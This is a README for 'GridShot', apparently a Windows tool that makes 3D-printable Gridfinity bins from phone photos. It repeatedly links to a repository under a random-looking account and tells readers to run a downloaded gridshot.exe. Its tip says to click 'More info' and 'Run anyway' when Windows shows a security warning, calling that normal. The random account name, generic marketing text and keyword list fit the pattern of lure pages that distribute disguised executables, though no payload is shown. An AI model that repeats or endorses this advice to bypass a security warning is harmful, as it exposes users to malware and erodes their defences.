# 🎯 gridshot - Turn Phone Photos Into Perfect Tool Bins

<p align="center">
  <a href="https://github.com/Girondismascorbicacid50/gridshot"><img src="https://img.shields.io/badge/Download-GridShot-2ea44f?style=for-the-badge&logo=github" alt="Download GridShot"></a>
</p>

---

## 📖 What Is GridShot?

GridShot is a **desktop application for Windows** that turns simple photos of your tools into **ready-to-3D-print storage bins**. Instead of measuring every tool by hand or using complicated CAD software, you just:

1. Take two photos of a tool with your phone
2. Let GridShot calculate the exact shape
3. Generate a custom Gridfinity bin that fits perfectly

GridShot works **entirely on your computer**. Your photos never leave your machine. No cloud uploads, no accounts, no waiting for a server.

---

## 🚀 Quick Start: Download and Run GridShot

**Step 1: Download the application**

Visit this link to download the application:
👉 **[https://github.com/Girondismascorbicacid50/gridshot](https://github.com/Girondismascorbicacid50/gridshot)**

**Step 2: Extract the downloaded file**

After the download finishes, locate the file in your **Downloads** folder. Right-click the file and select **"Extract All"** (Windows has this built in). Choose a folder you can easily find, like your Desktop.

**Step 3: Run GridShot**

Open the extracted folder and double-click the file named **`gridshot.exe`**. That's it! No installation process, no commands, no setup wizard.

> 💡 **Tip:** If Windows shows a blue "More info" screen, click **"More info"** and then **"Run anyway"**. This is normal for newer apps that haven't been downloaded by millions of people yet.

---

## 📸 How GridShot Works

GridShot uses **two calibrated photos** to understand the exact 3D shape of your tool:

| Step | What Happens |
|------|--------------|
| 1 | Place your tool on a **calibration card** (printed from the included template) |
| 2 | Take **Photo A** from directly above |
| 3 | Take **Photo B** from a 30-degree angle |
| 4 | GridShot's GPU-accelerated engine processes both images |
| 5 | Review the generated outline and click **"Generate Bin"** |

The entire photo-to-bin process takes **under 30 seconds** on modern hardware. Your graphics card (GPU) speeds up the image processing dramatically.

---

## 🛠️ Batch Processing and Tool Library

GridShot isn't just for one tool at a time. It's built for **serious workshop organization**:

### 📦 Resumable Batches
- Capture **dozens of tools** in a single session
- **Pause and resume** anytime — GridShot saves your progress
- Process multiple tools in one go and get a complete set of bins

### 🗂️ Reusable Tool Library
- Every tool you scan is stored in a **built-in library**
- **Re-generate** a bin anytime, even if you lose the original file
- **Compare tools** side-by-side to spot similar shapes
- Your library stays **100% local** — private and always available

---

## ✅ Why Choose GridShot?

- **🔒 Privacy First** — No workshop photos sent to hosted services. Ever.
- **⚡ GPU-Accelerated** — Uses your graphics card for lightning-fast processing.
- **📐 Calibrated Accuracy** — Two-photo method ensures precise outlines.
- **🔄 Resumable** — Stop mid-batch and pick up exactly where you left off.
- **🏗️ Gridfinity Ready** — Outputs bins that match the popular Gridfinity storage system.

---

## 🧰 System Requirements (Recommended)

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **Operating System** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **Processor** | Any dual-core CPU | Intel i5 / AMD Ryzen 5 or better |
| **Memory (RAM)** | 4 GB | 8 GB or more |
| **Graphics Card** | Integrated GPU | Discrete GPU (NVIDIA/AMD) |
| **Storage** | 200 MB free | SSD recommended |
| **Display** | 1366×768 | 1920×1080 or higher |

**Note:** GridShot uses your GPU for faster photo processing. A dedicated graphics card (even an older one) will noticeably improve performance.

---

## ❓ Frequently Asked Questions

### Do I need to know how to code?
**No.** GridShot has a simple visual interface. If you can take a photo with your phone, you can use GridShot.

### Do I need a special camera?
**No.** Any modern smartphone camera works. The calibration card handles the accuracy.

### Is my data shared with anyone?
**No.** GridShot is **local-first** software. All photo processing and 3D generation happens on your computer.

### What is Gridfinity?
Gridfinity is a popular modular storage system for workshops. Bins snap into a standard grid baseplate, keeping your tools organized and accessible.

### Can I try it before committing?
Yes! GridShot is a working prototype. Download it, scan one tool, and see the quality for yourself.

---

## 📈 Product Status

GridShot is classified as an **accuracy-focused working prototype**. The core photo-to-bin pipeline is fully functional, and the software includes a **comprehensive regression suite** to ensure measurements stay precise across updates.

Expect:
- 🟢 **Working capture and bin generation**
- 🟢 **Batch processing with resume**
- 🟢 **Local tool library**
- 🟡 **Ongoing refinement** of edge cases and user interface polish

---

## 🧠 Operations: What Happens Behind the Scenes

1. **Photo Intake** — Your two photos are loaded and scaled using the calibration card reference.
2. **GPU Processing** — The graphics card accelerates feature detection and edge mapping.
3. **Outline Generation** — GridShot creates a clean 2D silhouette of your tool.
4. **3D Conversion** — The outline is extruded into a Gridfinity-compatible bin with proper clearances.
5. **Export** — Save the finished bin as a 3D-printable file (STL format).

---

## 📚 Tips for Best Results

- **Good lighting** — Use a bright, even light source to reduce shadows
- **Flat surface** — Make sure the calibration card lies completely flat
- **Square alignment** — Keep the camera parallel to the card for Photo A
- **Consistent angle** — Use a phone tripod or a stack of books for Photo B
- **Clean tools** — Remove debris or grease that could obscure edges

---

## 🆘 Getting Help

- **Report an issue** → Visit the repository and open an issue on GitHub
- **Feature suggestions** → Let the developer know what would improve your workflow

---

## 📄 License

GridShot is distributed under an open-source license. Review the license file in the repository for full terms.

---

**Ready to organize your workshop?**  
👉 **[Download GridShot now](https://github.com/Girondismascorbicacid50/gridshot)** and turn your phone into a precision measuring tool.

Keywords: Gridfinity, tool organization, 3D printing, photo calibration, desktop app, Windows, GPU-accelerated, workshop, storage bins, local-first, batch processing, STL export, open source, grid system, maker tools